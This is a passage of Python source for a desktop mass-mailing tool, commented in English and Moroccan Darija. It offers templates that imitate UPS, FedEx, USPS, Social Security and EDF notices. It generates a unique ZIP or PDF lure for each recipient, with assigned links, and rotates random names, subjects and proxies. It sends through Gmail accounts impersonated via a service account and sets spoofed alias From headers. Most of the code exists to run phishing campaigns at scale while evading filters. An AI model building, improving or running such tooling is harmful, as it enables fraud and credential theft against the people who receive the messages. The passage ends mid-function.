            elif sys.platform == "darwin":
                os.system(f'open "{folder}"')
            else:
                os.system(f'xdg-open "{folder}"')
            self._log(f"📂 Opened folder: {folder}", C["accent2"])
        except Exception as e:
            self._log(f"✗ Open folder failed: {e}", C["red"])
    
    def _generate_zip_pdfs(self):
        """
        Generate MULTIPLE ZIPs (1 per link) → each ZIP fih 1 PDF unique.
        
        Workflow:
        1. Get links list (mital: 100 links)
        2. Per link: generate 1 PDF + ZIP it (m3a smart professional name)
        3. = 100 ZIPs different physical files
        4. Auto-add ga3 ZIPs l Random Attachments
        5. Per email = different ZIP physical (rotation)
        """
        links = self._get_auto_html_links()
        if not links:
            messagebox.showwarning("No links",
                "Add links l'awwal!\n\nWla use URL Generator.")
            return
        
        if not PDF_OK:
            messagebox.showerror("reportlab missing",
                "Install reportlab l'awwal:\n\npip install reportlab")
            return
        
        # Confirm
        if not messagebox.askyesno("Generate Multiple ZIPs",
            f"Ghadi ngenra {len(links)} ZIPs different files?\n\n"
            f"Per ZIP = 1 PDF m3a unique link\n"
            f"Per ZIP = professional random filename\n"
            f"Output: {len(links)} ZIP files f generated_pdfs/ folder\n\n"
            f"Per email mlli SEND = different ZIP rotated\n\n"
            f"Continue?"):
            return
        
        self.zip_status_lbl.config(text=f"⏳ Generating {len(links)} ZIPs...",
                                     fg=C["yellow"])
        
        def _do():
            try:
                import zipfile
                
                folder = self._get_pdfs_folder()
                
                # Clear old files (PDFs w ZIPs)
                for old_file in os.listdir(folder):
                    if old_file.endswith('.pdf') or old_file.endswith('.zip'):
                        try:
                            os.remove(os.path.join(folder, old_file))
                        except: pass
                
                # Clear old ZIPs mn attachment_files
                self.after(0, lambda: self._clear_old_generated_zips())
                
                # 🎯 NEW: Store mapping {zip_path: link_url}
                # Bach mlli SEND, app y'regenerate ZIP m3a REAL recipient data
                self._generated_zip_links = {}
                
                # Generate ZIPs (placeholder content, will be regenerated per email)
                zip_paths = []
                generated = 0
                failed = 0
                used_filenames = set()
                
                for idx, link_url in enumerate(links, 1):
                    try:
                        # Generate placeholder attachment (PDF wla HTML — format-aware)
                        att_bytes, ext = self._theme_get_attachment(
                            "Customer",
                            "placeholder@example.com",
                            link_url
                        )
                        
                        # 🎯 Generate inner filename FIRST, then use it for both
                        inner_name = _gen_cola_inner_filename()
                        zip_filename = f"{inner_name}.zip"
                        
                        # Avoid duplicates
                        attempts = 0
                        while zip_filename in used_filenames and attempts < 50:
                            inner_name = _gen_cola_inner_filename()
                            zip_filename = f"{inner_name}.zip"
                            attempts += 1
                        if zip_filename in used_filenames:
                            zip_filename = f"{inner_name}_{idx}.zip"
                            inner_name = f"{inner_name}_{idx}"
                        used_filenames.add(zip_filename)
                        
                        # Create ZIP m3a SAME filename inside (matching!)
                        zip_path = os.path.join(folder, zip_filename)
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            zf.writestr(f"{inner_name}.{ext}", att_bytes)
                        
                        # 🎯 Store link assigned to this ZIP
                        self._generated_zip_links[zip_path] = link_url
                        
                        zip_paths.append(zip_path)
                        generated += 1
                        
                        if generated % 5 == 0:
                            self.after(0, lambda g=generated, t=len(links):
                                       self.zip_status_lbl.config(
                                           text=f"⏳ Generated {g}/{t} ZIPs...",
                                           fg=C["yellow"]))
                    except Exception as e:
                        failed += 1
                        self._log(f"  ✗ Failed ZIP {idx}: {str(e)[:60]}", C["red"])
                
                if not zip_paths:
                    self.after(0, lambda: self.zip_status_lbl.config(
                        text=f"✗ No ZIPs generated", fg=C["red"]))
                    return
                
                # Auto-add ga3 ZIPs l Random Attachments
                def _add_zips_to_ui():
                    for zip_path in zip_paths:
                        if zip_path not in self.attachment_files:
                            self.attachment_files.append(zip_path)
                            self.att_listbox.insert("end",
                                f"📦 {os.path.basename(zip_path)}")
                    self.att_count_lbl.config(
                        text=f"{len(self.attachment_files)} files")
                    self.att_mode.set("random")
                
                self.after(0, _add_zips_to_ui)
                
                total_size = sum(os.path.getsize(p) for p in zip_paths) / 1024
                
                self.after(0, lambda g=generated, f=failed, s=total_size:
                           self.zip_status_lbl.config(
                               text=f"✅ {g} ZIPs · ZIPs ghadi yt'regenrew per email m3a REAL [NAME] [EMAIL]",
                               fg=C["green"]))
                
                self._log(f"📦 {generated} ZIPs created · per email = unique ZIP m3a REAL recipient data!",
                          C["green"])
                self._log(f"   ✅ Per email: ZIP regenerated m3a real name + real email + assigned link",
                          C["accent2"])
                self._log(f"   Examples: {os.path.basename(zip_paths[0])} · {os.path.basename(zip_paths[1]) if len(zip_paths) > 1 else '...'}",
                          C["text3"])
                
                if failed > 0:
                    self._log(f"   ⚠ {failed} ZIPs failed", C["yellow"])
            
            except Exception as e:
                err = str(e)[:80]
                self.after(0, lambda er=err: self.zip_status_lbl.config(
                    text=f"✗ Error: {er}", fg=C["red"]))
                self._log(f"✗ ZIP generation failed: {err}", C["red"])
        
        threading.Thread(target=_do, daemon=True).start()
    
    def _clear_old_generated_zips(self):
        """Clear old generated ZIPs mn Random Attachments box"""
        folder = self._get_pdfs_folder()
        # Remove paths li starts m3a generated folder
        new_files = []
        new_listbox_items = []
        for i, path in enumerate(self.attachment_files):
            if not path.startswith(folder):
                new_files.append(path)
                # Get current listbox text
                try:
                    if i < self.att_listbox.size():
                        new_listbox_items.append(self.att_listbox.get(i))
                except: pass
        
        # Clear w re-add non-generated files
        self.attachment_files.clear()
        self.attachment_files.extend(new_files)
        self.att_listbox.delete(0, "end")
        for item in new_listbox_items:
            self.att_listbox.insert("end", item)
        self.att_count_lbl.config(text=f"{len(self.attachment_files)} files")
        
        # 🎯 Clear mapping too
        if hasattr(self, '_generated_zip_links'):
            self._generated_zip_links = {}
    
    def _extract_pdf_from_zip(self, zip_path):
        """Extract list dyal PDF paths mn ZIP file (for use f attachments)"""
        import zipfile, tempfile
        
        try:
            # Extract l temp folder
            extract_folder = os.path.join(tempfile.gettempdir(), "sender_zip_extract")
            os.makedirs(extract_folder, exist_ok=True)
            
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(extract_folder)
            
            # Get PDFs
            pdfs = [os.path.join(extract_folder, f)
                    for f in os.listdir(extract_folder)
                    if f.lower().endswith('.pdf')]
            return pdfs
        except Exception as e:
            self._log(f"⚠ Failed extract ZIP: {e}", C["yellow"])
            return []
    
    # ─── 🌍 LANGUAGE SWITCHER ─────────────────────────────────────
    def _set_app_language(self, lang_code):
        """Switch app language (EN/FR/ES/UK)"""
        global CURRENT_LANGUAGE
        if lang_code not in LANG_DATA:
            return
        
        CURRENT_LANGUAGE = lang_code
        
        # Update language buttons UI
        if hasattr(self, '_lang_buttons'):
            for code, btn in self._lang_buttons.items():
                if code == lang_code:
                    btn.config(bg=C["green"], fg="#000")
                else:
                    btn.config(bg=C["bg3"], fg=C["text"])
        
        # Update status label
        if hasattr(self, 'lang_status_lbl'):
            lang_full = {
                "EN": "🇺🇸 English (USA)",
                "UK": "🇬🇧 English (UK)",
                "FR": "🇫🇷 Français (France)",
                "ES": "🇪🇸 Español (España)",
            }.get(lang_code, lang_code)
            self.lang_status_lbl.config(text=f"Active: {lang_full}")
        
        self._log(f"🌍 Language changed → {lang_code} · names + subjects + templates daba b'{lang_code}", C["green"])
    
    def _set_auto_format(self, fmt):
        """Switch attachment format (pdf / html / direct)"""
        if fmt not in ("pdf", "html", "direct"):
            return
        
        self.auto_format.set(fmt)
        
        # Update buttons UI
        if hasattr(self, '_format_buttons'):
            for code, btn in self._format_buttons.items():
                if code == fmt:
                    btn.config(bg=C["green"], fg="#000")
                else:
                    btn.config(bg=C["bg3"], fg=C["text"])
        
        try:
            self._log(f"📋 Attachment format → {fmt.upper()}", C["yellow"])
        except: pass
    
    def _set_theme(self, theme_code):
        """Switch theme (delivery / cola / ssa_simple / ups / ups_amazon / fedex / usps / edf / mix)"""
        valid = ("delivery", "cola", "ssa_simple", "ups", "ups_amazon", "fedex", "usps", "edf", "mix")
        if theme_code not in valid:
            return
        
        self.theme_var.set(theme_code)
        
        # Update theme buttons UI
        if hasattr(self, '_theme_buttons'):
            for code, btn in self._theme_buttons.items():
                if code == theme_code:
                    btn.config(bg=C["green"], fg="#000")
                else:
                    btn.config(bg=C["bg3"], fg=C["text"])
        
        # 🆕 V106: Show Mix selector popup ila click on Mix
        if theme_code == "mix":
            self._show_mix_selector()
        
        # Update status label
        status_msgs = {
            "delivery":   "Templates: Delivery (21M+ combos)",
            "cola":       "Templates: COLA / Social Security (191B combos)",
            "ssa_simple": "Templates: SSA Simple Statement (random lifetime)",
            "ups":        "Templates: UPS Delivery (random shippers · auto current date)",
            "ups_amazon": "Templates: UPS Amazon ONLY (fixed shipper · auto current date)",
            "fedex":      "Templates: FedEx Delivery Manager (auto date · random tracking)",
            "usps":       "Templates: USPS Expected Delivery (auto date · random tracking)",
            "edf":        "Templates: EDF Facture (15K+ combos · lifetime random)",
            "mix":        "Templates: MIX random (configurable)",
        }
        if hasattr(self, 'theme_status_lbl'):
            self.theme_status_lbl.config(text=status_msgs.get(theme_code, ""))
        
        self._log(f"🎨 Theme changed → {theme_code}", C["yellow"])
    
    def _show_mix_selector(self):
        """Show popup to select which themes to include in Mix mode."""
        popup = tk.Toplevel(self)
        popup.title("🎲 Mix — Select Themes")
        popup.geometry("420x450")
        popup.configure(bg=C["bg0"])
        popup.transient(self)
        popup.grab_set()
        
        # Header
        hdr = tk.Frame(popup, bg=C["bg1"])
        hdr.pack(fill="x", padx=10, pady=10)
        tk.Label(hdr, text="🎲 Mix Mode — Select Themes",
                 bg=C["bg1"], fg=C["yellow"],
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=12, pady=10)
        
        tk.Label(popup,
                 text="Choose which themes will be randomly used per email:",
                 bg=C["bg0"], fg=C["text2"],
                 font=("Segoe UI", 9, "italic")).pack(anchor="w", padx=14, pady=(0, 10))
        
        # Init selected set
        if not hasattr(self, '_mix_selected_themes'):
            self._mix_selected_themes = set()
        
        # Checkboxes
        check_frame = tk.Frame(popup, bg=C["bg0"])
        check_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        themes_list = [
            ("delivery",   "📦 Delivery"),
            ("cola",       "🏛️ COLA"),
            ("ssa_simple", "🏛️ SSA Simple"),
            ("ups",        "📦 UPS"),
            ("ups_amazon", "📦 UPS Amazon"),
            ("fedex",      "📦 FedEx"),
            ("usps",       "📬 USPS"),
            ("edf",        "⚡ EDF"),
        ]
        
        check_vars = {}
        for code, label in themes_list:
            var = tk.BooleanVar(value=(code in self._mix_selected_themes))
            check_vars[code] = var
            cb = tk.Checkbutton(check_frame, text=label,
                                 variable=var,
                                 bg=C["bg0"], fg=C["text"],
                                 selectcolor=C["bg2"],
                                 activebackground=C["bg0"],
                                 activeforeground=C["text"],
                                 font=("Segoe UI", 11),
                                 anchor="w")
            cb.pack(fill="x", anchor="w", pady=4)
        
        # Buttons
        btns = tk.Frame(popup, bg=C["bg0"])
        btns.pack(fill="x", padx=14, pady=14)
        
        def _save_selection():
            selected = {code for code, var in check_vars.items() if var.get()}
            if not selected:
                messagebox.showwarning("No selection", "Please select at least 1 theme.")
                return
            self._mix_selected_themes = selected
            self._log(f"🎲 Mix themes: {', '.join(sorted(selected))}", C["yellow"])
            
            # Update status
            count_text = f"Templates: MIX of {len(selected)} themes ({', '.join(sorted(selected))})"
            if hasattr(self, 'theme_status_lbl'):
                self.theme_status_lbl.config(text=count_text)
            
            popup.destroy()
        
        def _select_all():
            for var in check_vars.values():
                var.set(True)
        
        def _deselect_all():
            for var in check_vars.values():
                var.set(False)
        
        tk.Button(btns, text="✓ Select All",
                  bg=C["bg3"], fg=C["text"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9),
                  command=_select_all).pack(side="left", ipady=6, ipadx=10, padx=(0, 4))
        
        tk.Button(btns, text="✗ Clear",
                  bg=C["bg3"], fg=C["text"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9),
                  command=_deselect_all).pack(side="left", ipady=6, ipadx=10, padx=(0, 4))
        
        tk.Button(btns, text="💾 Save",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=_save_selection).pack(side="right", ipady=6, ipadx=20)
    
    def _set_template_style(self, style_code):
        """Switch template style (old / simple / new / minimal / mix)"""
        if style_code not in ("old", "simple", "new", "minimal", "mix"):
            return
        
        self.template_style_var.set(style_code)
        
        # Update buttons UI
        if hasattr(self, '_template_style_buttons'):
            for code, btn in self._template_style_buttons.items():
                if code == style_code:
                    btn.config(bg=C["green"], fg="#000")
                else:
                    btn.config(bg=C["bg3"], fg=C["text"])
        
        # Update status
        status_msgs = {
            "old":     "Style: Old (newsletter detailed HTML)",
            "simple":  "Style: Simple HTML (lightweight)",
            "new":     "Style: Plain Text (personal email feel)",
            "minimal": "Style: Minimal (just a dot)",
            "mix":     "Style: Mix random (rotates per email)",
        }
        if hasattr(self, 'template_style_lbl'):
            self.template_style_lbl.config(text=status_msgs.get(style_code, ""))
        
        self._log(f"📝 Style changed → {style_code}", C["yellow"])
    
    def _preview_body_template(self):
        """Preview the current template style — render as HTML f browser ila html, txt ila plain."""
        try:
            # Generate sample preview m3a real recipient placeholder
            sample_email = "preview@example.com"
            sample_name = "John"
            sample_link = "https://example.com/notice"
            
            sample_body = self._theme_get_template(
                recipient_name=sample_name,
                recipient_email=sample_email,
                link_url=sample_link,
            )
            
            # Apply personalization (in case any [NAME]/[EMAIL] left)
            sample_body = self._personalize_content(sample_body, sample_email)
            
            style = self.template_style_var.get() if hasattr(self, 'template_style_var') else 'old'
            theme = self.theme_var.get() if hasattr(self, 'theme_var') else 'cola'
            
            # Detect if HTML or plain text
            is_html = sample_body.strip().startswith("<") or "<html" in sample_body.lower() or "<body" in sample_body.lower() or "<table" in sample_body.lower() or "<!DOCTYPE" in sample_body
            
            if is_html:
                # Save to temp file + open in browser
                import tempfile, webbrowser, os as _os
                tmp_dir = tempfile.gettempdir()
                preview_path = _os.path.join(tmp_dir, f"sender_preview_{theme}_{style}.html")
                
                # Just clean HTML — no preview banner
                with open(preview_path, "w", encoding="utf-8") as f:
                    f.write(sample_body)
                
                webbrowser.open(f"file://{preview_path}")
                self._log(f"✏ Preview opened f browser ({theme}/{style})", C["accent2"])
            else:
                # Plain text — show f popup
                preview = tk.Toplevel(self)
                preview.title(f"✏ Preview · Theme: {theme} · Style: {style}")
                preview.geometry("800x600")
                preview.configure(bg=C["bg0"])
                
                hdr = tk.Frame(preview, bg=C["bg1"])
                hdr.pack(fill="x", padx=10, pady=10)
                tk.Label(hdr, text=f"✏ Preview · {theme.upper()} · {style.upper()}",
                         bg=C["bg1"], fg=C["yellow"],
                         font=("Segoe UI", 11, "bold")).pack(side="left", padx=10, pady=8)
                tk.Button(hdr, text="🔄 Regenerate",
                          bg=C["accent2"], fg="#000",
                          relief="flat", bd=0, cursor="hand2",
                          font=("Segoe UI", 9, "bold"),
                          command=lambda: [preview.destroy(), self._preview_body_template()]
                          ).pack(side="right", padx=10, pady=6, ipady=2, ipadx=8)
                
                txt = tk.Text(preview, wrap="word",
                              bg=C["input"], fg=C["text"],
                              font=("Cascadia Code", 10),
                              insertbackground=C["text"])
                txt.pack(fill="both", expand=True, padx=10, pady=(0, 10))
                txt.insert("1.0", sample_body)
                txt.config(state="disabled")
        except Exception as e:
            messagebox.showerror("Preview Error", f"Failed to generate preview: {e}")
    
    # ─── 🔗 AUTO HTML ATTACHMENT helpers ─────────────────────────
    def _update_auto_html_count(self, event=None):
        """Update count dyal links"""
        try:
            text = self.auto_html_links_text.get("1.0", "end").strip()
            links = [l.strip() for l in text.splitlines() if l.strip()]
            n = len(links)
            self.auto_html_count_lbl.config(
                text=f"{n} link{'s' if n != 1 else ''}",
                fg=C["green"] if n > 0 else C["text3"])
        except: pass
    
    def _get_auto_html_links(self):
        """Get list dyal links f auto html"""
        try:
            text = self.auto_html_links_text.get("1.0", "end").strip()
            return [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith("#")]
        except:
            return []
    
    def _import_auto_html_links(self):
        """Import links mn .txt file"""
        path = filedialog.askopenfilename(
            title="Import links",
            filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if path:
            try:
                with open(path, encoding="utf-8") as f:
                    content = f.read()
                self.auto_html_links_text.delete("1.0", "end")
                self.auto_html_links_text.insert("1.0", content)
                self._update_auto_html_count()
                self._log(f"📥 Imported links mn {os.path.basename(path)}", C["green"])
            except Exception as e:
                self._log(f"✗ Import failed: {e}", C["red"])
    
    def _generate_url_list(self):
        """Generate URLs mn base URL + range (1 → N)"""
        try:
            base = self.gen_base_url.get().strip()
            start = int(self.gen_start.get())
            end = int(self.gen_end.get())
            
            if not base:
                messagebox.showerror("Error", "Enter base URL l'awwal")
                return
            
            if start > end:
                messagebox.showerror("Error", "From lazem > To")
                return
            
            if (end - start) > 10000:
                if not messagebox.askyesno("Big range",
                    f"Ghadi tgenra {end-start+1} URLs.\nMteknich big bzaaf?\n\nContinue?"):
                    return
            
            # Build URLs
            urls = []
            base_clean = base.rstrip('/')
            for i in range(start, end + 1):
                urls.append(f"{base_clean}/{i}")
            
            # Replace existing links
            self.auto_html_links_text.delete("1.0", "end")
            self.auto_html_links_text.insert("1.0", "\n".join(urls))
            self._update_auto_html_count()
            
            self._log(f"⚡ Generated {len(urls)} URLs ({base_clean}/{start} → /{end})",
                      C["green"])
        except ValueError as e:
            messagebox.showerror("Error", f"Invalid range: {e}")
        except Exception as e:
            self._log(f"✗ Generate failed: {e}", C["red"])
    
    def _preview_auto_html(self):
        """Preview attachment (PDF wla HTML) l email dyalek"""
        links = self._get_auto_html_links()
        if not links:
            self._log("⚠ Add links l'awwal", C["yellow"])
            messagebox.showwarning("No links", "Add at least 1 link l'awwal!")
            return
        
        # Get current format
        fmt = self.auto_format.get() if hasattr(self, 'auto_format') else 'pdf'
        
        # Generate sample
        sample_email = "preview@example.com"
        sample_name = "Preview"
        sample_link = links[0]
        
        # Generate using format-aware wrapper
        att_bytes, ext = self._theme_get_attachment(sample_name, sample_email, sample_link)
        
        # Save l temp file w open f system viewer
        try:
            import tempfile, webbrowser, sys
            tmp = tempfile.NamedTemporaryFile(
                mode='wb', suffix=f'.{ext}', delete=False)
            tmp.write(att_bytes)
            tmp_path = tmp.name
            tmp.close()
            
            # Cross-platform open
            if sys.platform == "win32":
                os.startfile(tmp_path)
            elif sys.platform == "darwin":
                os.system(f'open "{tmp_path}"')
            else:
                webbrowser.open(f'file://{tmp_path}')
            
            self._log(f"🧪 {ext.upper()} preview opened: {tmp_path}", C["accent2"])
            
            # Warning ila PDF format w reportlab missing
            if ext == 'pdf' and not PDF_OK:
                self._log("⚠ ⚠ ⚠ reportlab MAFICHI! PDF dyalek mashi mzyan", C["red"])
                self._log("   Fix: pip install reportlab + restart app", C["yellow"])
                if messagebox.askyesno("PDF Not Beautiful",
                    "L'PDF dyalek plain (mafichi design)!\n\n"
                    "L'mochkila: reportlab library mafichi installed.\n\n"
                    "L7all:\n"
                    "1. Open CMD/PowerShell\n"
                    "2. Run: pip install reportlab\n"
                    "3. Restart app\n\n"
                    "Bghiti ncopier command l clipboard?"):
                    self._copy_pip_command()
        except Exception as e:
            self._log(f"✗ Preview failed: {e}", C["red"])
    
    # ─── ALL RANDOM button: click wahed bach kolchi random ───
    def _set_all_random(self):
        """One-click: set all 3 random modes (display name, subject, body)"""
        try:
            # Display Name → Random List
            self.dn_mode.set("random")
            self._toggle_dn()
            
            # Subject → Random List
            self.subj_mode.set("random")
            self._toggle_subj()
            
            # Body → Random Templates
            self.body_mode.set("random")
            self._toggle_body()
            
            self._log("🎲 ALL RANDOM activated — names + subjects + templates auto-generate!", C["green"])
        except Exception as e:
            self._log(f"⚠ {e}", C["yellow"])

    def _import_leads(self):
        path = filedialog.askopenfilename(filetypes=[("Text","*.txt"),("All","*.*")])
        if path:
            with open(path, encoding="utf-8") as f:
                content = f.read()
            self.leads_text.delete("1.0","end")
            self.leads_text.insert("1.0", content)
            self._update_lead_count()

    def _update_lead_count(self, *args):
        lines = [l.strip() for l in self.leads_text.get("1.0","end").splitlines() if l.strip()]
        self.lead_count.config(text=f"{len(lines)} leads")

    def _get_api_service(self, user_email, proxy=None):
        sa_path = self.sa_file.get().strip()
        creds = service_account.Credentials.from_service_account_file(
            sa_path, scopes=SCOPES)
        creds = creds.with_subject(user_email)

        if proxy:
            try:
                import httplib2
                proxy_type_map = {"http": httplib2.socks.HTTP,
                                  "socks5": httplib2.socks.SOCKS5,
                                  "socks4": httplib2.socks.SOCKS4}
                ptype = proxy_type_map.get(proxy["type"], httplib2.socks.HTTP)
                http = httplib2.Http(proxy_info=httplib2.ProxyInfo(
                    ptype,
                    proxy["host"],
                    proxy["port"],
                    proxy_user=proxy["user"] or None,
                    proxy_pass=proxy["password"] or None,
                ))
                return build("gmail", "v1", credentials=creds, http=creds.authorize(http))
            except Exception:
                pass

        return build("gmail", "v1", credentials=creds)

    def _get_fresh_api_service(self, user_email):
        """Get API service with fresh random proxy for each send"""
        proxy = None
        if self.proxy_tab.enabled.get() and self.proxy_tab.proxy_target.get() in ("api","both","all"):
            proxy = self.proxy_tab.get_random_proxy()
        return self._get_api_service(user_email, proxy), proxy

    def _connect_all(self):
        sa_path = self.sa_file.get().strip()
        if not sa_path or not os.path.exists(sa_path):
            messagebox.showerror("Error","Select service_account.json"); return
        accounts = [l.strip() for l in self.senders_text.get("1.0","end").splitlines() if l.strip()]
        if not accounts:
            messagebox.showerror("Error","Add sender emails"); return
        self.connect_status.config(text="Connecting...", fg=C["yellow"])
        self.services = {}

        def _do():
            ok, failed = [], []
            for email in accounts:
                try:
                    svc = self._get_api_service(email)
                    svc.users().getProfile(userId="me").execute()
                    self.services[email] = svc
                    ok.append(email)
                    self._log(f"✓ API connected: {email}", C["green"])
                except Exception as e:
                    failed.append(email)
                    self._log(f"✗ {email}: {str(e)[:80]}", C["red"])

            def _upd():
                if ok:
                    self.sender_accounts = ok
                    self.sender_combo["values"] = ["All (rotate)"] + ok
                    self.sender_combo.set("All (rotate)")
                    self.status_lbl.config(text=f"● {len(ok)} API connected", fg=C["green"])
                    self.connect_status.config(
                        text=f"✓ {len(ok)} ok · ✗ {len(failed)} fail",
                        fg=C["green"] if not failed else C["yellow"])
                else:
                    self.status_lbl.config(text="● Not connected", fg=C["red"])
                    self.connect_status.config(text="All failed", fg=C["red"])
            self.after(0, _upd)
        threading.Thread(target=_do, daemon=True).start()

    def _extract_email_from_header(self, header_value):
        """
        Extract email address mn 'From' header
        
        "Display Name <user@domain.com>" → "user@domain.com"
        "user@domain.com"                → "user@domain.com"
        """
        if not header_value:
            return None
        if '<' in header_value and '>' in header_value:
            return header_value.split('<')[1].split('>')[0].strip()
        return header_value.strip()
    
    def _extract_name_from_email(self, email):
        """
        Extract first name mn email address.
        
        john@example.com → "John"
        john.smith@example.com → "John"
        john_smith@example.com → "John"
        john-smith@example.com → "John"
        contact@example.com → "Contact"
        12345@example.com → "Friend" (numeric only fallback)
        """
        if not email or '@' not in email:
            return "Friend"
        
        local = email.split('@')[0].strip()
        
        # Split bach we get first part
        for sep in ['.', '_', '-', '+']:
            if sep in local:
                local = local.split(sep)[0]
                break
        
        # Remove numbers w trim
        clean = ''.join(c for c in local if c.isalpha())
        
        if not clean:
            return "Friend"
        
        # Capitalize first letter
        return clean.capitalize()
    
    def _personalize_content(self, content, recipient_email):
        """
        Replace [NAME] w [EMAIL] placeholders f content.
        
        Supports variations:
          [NAME], [name], {NAME}, {{NAME}}, %NAME%
          [EMAIL], [email], {EMAIL}, {{EMAIL}}, %EMAIL%
        """
        if not content:
            return content
        
        name = self._extract_name_from_email(recipient_email)
        email = recipient_email
        
        # Replace ga3 variations
        replacements = {
            '[NAME]': name, '[name]': name, '[Name]': name,
            '{NAME}': name, '{name}': name, '{Name}': name,
            '{{NAME}}': name, '{{name}}': name, '{{Name}}': name,
            '%NAME%': name, '%name%': name, '%Name%': name,
            
            '[EMAIL]': email, '[email]': email, '[Email]': email,
            '{EMAIL}': email, '{email}': email, '{Email}': email,
            '{{EMAIL}}': email, '{{email}}': email, '{{Email}}': email,
            '%EMAIL%': email, '%email%': email, '%Email%': email,
        }
        
        for placeholder, value in replacements.items():
            content = content.replace(placeholder, value)
        
        return content
    
    def _build_mime(self, from_addr, display_name, to_email, subject, body_text, att_path=None, alias_from=None):
        """
        Build MIME message m3a personalization.
        
        Args:
            from_addr:  Original sender email (used l envelope)
            alias_from: Optional alias address bach yt'replace f "From" header
            to_email:   Recipient (used l [NAME] w [EMAIL] replacement)
        """
        msg = MIMEMultipart()
        
        # Use alias l "From" header ila kayna
        display_from = alias_from if alias_from else from_addr
        msg["From"] = f"{display_name} <{display_from}>" if display_name else display_from
        msg["Reply-To"] = display_from  # Replies kayrjou3o l alias
        
        msg["To"] = to_email
        
        # 🎯 PERSONALIZATION: Replace [NAME] w [EMAIL] f subject + body
        subject = self._personalize_content(subject, to_email)
        body_text = self._personalize_content(body_text, to_email)
        
        msg["Subject"] = subject
        
        # 📄 Auto-detect HTML wla plain text
        body_lower = body_text.strip().lower()
        is_html = (
            body_lower.startswith('<!doctype html') or
            body_lower.startswith('<html') or
            ('<body' in body_lower and '</body>' in body_lower) or
            ('<table' in body_lower and '</table>' in body_lower)
        )
        
        if is_html:
            msg.attach(MIMEText(body_text, "html", "utf-8"))
        else:
            msg.attach(MIMEText(body_text, "plain", "utf-8"))
        
        # Random attachment (one path passed)
        if att_path and os.path.exists(att_path):
            # 🎯 SMART ZIP — Ila ZIP mn generated_pdfs folder, regenerate m3a real data!
            is_generated_zip = (
                att_path.lower().endswith('.zip') and
                hasattr(self, '_generated_zip_links') and
                att_path in self._generated_zip_links
            )
            
            if is_generated_zip:
                # 🎁 Regenerate ZIP m3a real recipient data!
                try:
                    import zipfile, io
                    
                    # Get link assigned to this ZIP
                    link_url = self._generated_zip_links[att_path]
                    
                    # Extract real name mn email
                    recipient_name = self._extract_name_from_email(to_email)
                    
                    # Generate fresh attachment m3a REAL data (format-aware)
                    att_bytes, ext = self._theme_get_attachment(
                        recipient_name,
                        to_email,
                        link_url
                    )
                    
                    # 🎯 Inner filename = OUTER ZIP filename (matching!)
                    outer_zip_name = os.path.basename(att_path)
                    inner_name = outer_zip_name[:-4] if outer_zip_name.endswith('.zip') else outer_zip_name
                    
                    # Create ZIP in memory m3a SAME filename inside
                    zip_buffer = io.BytesIO()
                    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                        zf.writestr(f"{inner_name}.{ext}", att_bytes)
                    
                    # Use ZIP bytes
                    att = MIMEBase("application", "zip")
                    att.set_payload(zip_buffer.getvalue())
                    encoders.encode_base64(att)
                    
                    # Use original ZIP filename (professional name)
                    final_filename = self._personalize_content(
                        os.path.basename(att_path), to_email)
                    
                    att.add_header("Content-Disposition","attachment",
                                   filename=final_filename)
                    msg.attach(att)
                except Exception as e:
                    # Fallback: use file as-is
                    self._log(f"⚠ Dynamic ZIP failed, using static: {str(e)[:60]}", C["yellow"])
                    is_generated_zip = False
            
            if not is_generated_zip:
                # Normal attachment (mashi generated ZIP)
                mt, _ = mimetypes.guess_type(att_path)
                main_t, sub_t = (mt.split("/",1) if mt else ("application","octet-stream"))
                with open(att_path,"rb") as f:
                    att = MIMEBase(main_t, sub_t)
                    att.set_payload(f.read())
                    encoders.encode_base64(att)
                    
                    final_filename = self._personalize_content(
                        os.path.basename(att_path), to_email)
                    
                    att.add_header("Content-Disposition","attachment",
                                   filename=final_filename)
                    msg.attach(att)
        
        # 📌 FIXED ATTACHMENTS — kaymchiw m3a kol email!
        for fixed_path in self.fixed_attachment_files:
            if os.path.exists(fixed_path):
                mt, _ = mimetypes.guess_type(fixed_path)
                main_t, sub_t = (mt.split("/",1) if mt else ("application","octet-stream"))
                with open(fixed_path,"rb") as f:
                    att = MIMEBase(main_t, sub_t)
                    att.set_payload(f.read())
                    encoders.encode_base64(att)
                    att.add_header("Content-Disposition","attachment",
                                   filename=os.path.basename(fixed_path))
                    msg.attach(att)
        
        # 📎 AUTO ATTACHMENT — PDF or HTML per-email m3a [NAME] [EMAIL] + random link
        try:
            if hasattr(self, 'auto_html_enabled') and self.auto_html_enabled.get():
                links = self._get_auto_html_links()
                if links:
                    # Pick random link mn list
                    link_url = random.choice(links)
                    
                    # Extract name mn email
                    recipient_name = self._extract_name_from_email(to_email)
                    
                    # 📎 Generate attachment (PDF or HTML — format-aware)
                    att_bytes, ext = self._theme_get_attachment(
                        recipient_name, to_email, link_url)
                    
                    # Get filename (m3a personalization, correct extension)
                    user_filename = self.auto_html_filename.get().strip()
                    if user_filename:
                        # User typed manually
                        filename = self._personalize_content(user_filename, to_email)
                        # Force correct extension
                        base = filename.rsplit('.', 1)[0] if '.' in filename else filename
                        filename = f"{base}.{ext}"
                    else:
                        # 🎲 Random COLA filename per email!
                        filename = f"{_gen_cola_inner_filename()}.{ext}"
                    
                    # Attach m3a correct MIME type
                    if ext == 'html':
                        att = MIMEBase("text", "html")
                    else:
                        att = MIMEBase("application", "pdf")
                    att.set_payload(att_bytes)
                    encoders.encode_base64(att)
                    att.add_header("Content-Disposition", "attachment",
                                   filename=filename)
                    msg.attach(att)
        except Exception as e:
            # Mafichi crash, just log
            pass
        
        return msg

    def _send_via_resend(self, msg, recipient_email):
        """Send email via Resend API.
        🆕 V87: Uses msg's From (random name applied!)
        🆕 V87: Optional proxy support
        msg = email.message.EmailMessage object
        recipient_email = string (already in msg, but used for tracking)
        Returns: True or raises Exception
        """
        import requests
        
        api_key = self.resend_api_key.get().strip()
        if not api_key:
            raise ValueError("Resend API Key not set")
        
